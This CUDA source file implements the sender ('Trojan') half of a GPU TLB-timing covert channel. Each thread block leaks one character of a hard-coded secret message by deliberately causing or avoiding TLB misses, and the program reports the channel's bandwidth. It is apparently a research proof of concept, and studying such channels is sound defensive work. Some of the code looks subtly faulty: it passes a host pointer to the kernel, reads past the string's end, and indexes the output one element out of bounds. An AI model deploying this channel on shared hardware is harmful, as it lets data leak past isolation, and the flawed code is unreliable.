#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "sync_utils.h"

// The secret message to be leaked
const char* secret_message = "This is a secret message!";

static int limits[SETS] = {0};
///////////////////////////////////////////////////////////////////////////////////////////////////
// GPU utility and driver functions

__global__ void Trojan (unsigned long *trojan, unsigned long *out, unsigned long* start, int its2, const char* message) {
    int b_id = blockIdx.x;
    int s_index = b_id * (BUCKETS / BLOCKS), t1 = 0, t2 = 0, i, k;
    unsigned long s1 = start[s_index], s2 = start[s_index + 1], s3 = start[s_index + 2];
    long long start_time, end_time, p, loop, duration;

    __shared__ unsigned long s_out;

    s_out = warmup (trojan, start + s_index + 1, 1, 2 * REPEAT);

    // Each thread block sends one character of the message
    char secret_char = message[b_id];
    if (secret_char == '\0') {
        // If the message is shorter than the number of blocks, send null bytes
        secret_char = 0;
    }

    for (k = 0; k < 8; k++) { // Send 8 bits for the character

        // Extract the k-th bit of the secret character
        int bit_to_send = (secret_char >> (7 - k)) & 1;

        p = s3;
        /* Encoding scheme:
           - To send a '0', we cause a TLB miss for the spy (high latency).
           - To send a '1', we do nothing, allowing a TLB hit for the spy (low latency).
        */
        if (bit_to_send == 0) {
            for (i = 0; i < its2 * REPEAT; i++) {
                p = trojan[p];
                t1 += p;
            }
            s_out += t1;
        }

        p = s1;
        start_time = clock ();
        for (i = 0; i < its2 * REPEAT; i++) {
            p = trojan[p];
            t1 += p;
        }
        end_time = clock ();
        s_out += t1;
        s_out += end_time - start_time;

        p = s2;
        loop = 0;
        do {
            start_time = clock();
            for (i = 0; i < its2 * REPEAT; i++) {
                p = trojan[p];
                t1 += p;
            }
            end_time = clock();
            s_out += t1;
            duration = (end_time - start_time)/(its2 * REPEAT);
            loop++;
        } while ((duration < LATENCY_THRESHOLD)/* && loop < ITER_LIMIT*/);
    }
    out[b_id * BITS_TO_SEND] = s_out;
}


void cmem_stride (const char* message) {

    cudaError_t error_id;
    unsigned long e_size = sizeof (unsigned long);
    unsigned long a_size = (8 * GB) / e_size;
    unsigned long stride = (1 * MB) / e_size;

    cudaSetDevice (DEVICE);
    unsigned long *d_trojan;
    error_id = cudaMallocManaged ((void **) &d_trojan, e_size * a_size);
    if (error_id != cudaSuccess) {
        printf ("Error 1.0 is %s\n", cudaGetErrorString (error_id));
        return;
    }
    unsigned long *d_out;
     error_id = cudaMallocManaged ((void **) &d_out, BLOCKS * BITS_TO_SEND * e_size);
    if (error_id != cudaSuccess) {
        printf ("Error 1.0 is %s\n", cudaGetErrorString (error_id));
        return;
    }
    unsigned long *s_trojan;
    error_id = cudaMallocManaged ((void **) &s_trojan, e_size * (BUCKETS + 6));
    if (error_id != cudaSuccess) {
        printf ("Error 1.0 is %s\n", cudaGetErrorString (error_id));
        return;
    }

    create_pattern (d_trojan, a_size, stride, s_trojan, limits);

    dim3 block_trojan = dim3 (THREADS);
    dim3 grid_trojan = dim3 (BLOCKS, 1, 1);

    cudaStream_t stream1, stream3;
    cudaStreamCreate (&stream1);
    cudaStreamCreate (&stream3);

    setPrefetchAsync (d_trojan, s_trojan, &stream1, /*SETS*/BUCKETS);

    cudaStreamSynchronize (stream1);

    float t1;
    cudaEvent_t start, end;
    cudaEventCreate (&start);
    cudaEventCreate (&end);

    Timer timer;
    int its = ITER;
    startTime (&timer);
    cudaEventRecord (start, stream1);
    l_warmup<<<1, 1, 0, stream1>>>(d_trojan, s_trojan);
    Trojan<<<grid_trojan, block_trojan, 0, stream1>>> (d_trojan, d_out, s_trojan, its, message);

    cudaEventRecord (end, stream1);
    cudaEventSynchronize (end);
    stopTime (&timer);
    cudaEventElapsedTime (&t1, start, end);

    float s = elapsedTime(timer);

    printf ("Res: %lu\n", d_out[BLOCKS * BITS_TO_SEND]);
    printf ("[END] %f ms, %f s, %f bps\n", t1, s, BLOCKS * BITS_TO_SEND/s);
    printf ("\n");
    cudaFree (d_trojan);
    cudaFree (s_trojan);
    cudaFree (d_out);
}


int main (int argc, char **argv) {
    for (int i = 0; i < SETS; i++) {
        limits[i] = get_set_size (i);
        if (i + 1 < argc)
            limits[i] = (int) atoi (argv[i + 1]);
    }

    cmem_stride (secret_message);
    cudaDeviceReset ();
    return 0;
}
